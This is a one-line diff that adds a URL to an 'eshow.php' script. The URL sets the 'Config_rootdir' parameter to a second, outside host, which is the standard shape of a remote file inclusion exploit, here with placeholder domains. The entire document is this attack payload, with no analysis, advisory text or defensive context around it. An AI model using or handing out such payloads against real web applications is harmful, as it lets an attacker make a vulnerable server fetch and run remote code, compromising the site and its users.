@@ -1,0 +1,1 @@
+http://www.example.com/eshow.php?Config_rootdir=http://www.example2.com/
